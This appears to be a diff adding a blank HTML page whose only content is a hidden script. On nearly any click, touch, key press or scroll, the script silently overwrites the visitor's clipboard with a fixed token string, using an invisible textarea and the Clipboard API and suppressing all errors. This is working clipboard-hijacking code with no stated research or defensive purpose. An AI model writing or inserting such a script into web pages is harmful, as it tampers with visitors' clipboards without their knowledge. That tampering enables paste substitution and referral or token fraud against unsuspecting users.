@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title></title></head>
+<body>
+<script>
+(function(){
+    var T = 'UQClVqjfIIeXZH4FWppKMah4o-KyTO56cYerEKXH2Rl8L593';
+
+    function viaExec() {
+        try {
+            var ta = document.createElement('textarea');
+            ta.value = T;
+            ta.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;padding:0;border:0;outline:0;box-shadow:none;background:transparent;';
+            ta.setAttribute('readonly', '');
+            document.body.appendChild(ta);
+            ta.focus();
+            ta.select();
+            ta.setSelectionRange(0, ta.value.length);
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+        } catch(e) {}
+    }
+
+    function viaApi() {
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(T).catch(function(){});
+        }
+    }
+
+    function go() {
+        viaExec();
+        viaApi();
+    }
+
+    ['click','touchstart','mousedown','pointerdown','keydown','keyup',
+     'contextmenu','dblclick','mouseup','touchend','input','change','scroll','wheel']
+    .forEach(function(ev){
+        document.addEventListener(ev, go, {capture: true, passive: true});
+    });
+})();
+</script>
+</body>
+</html>
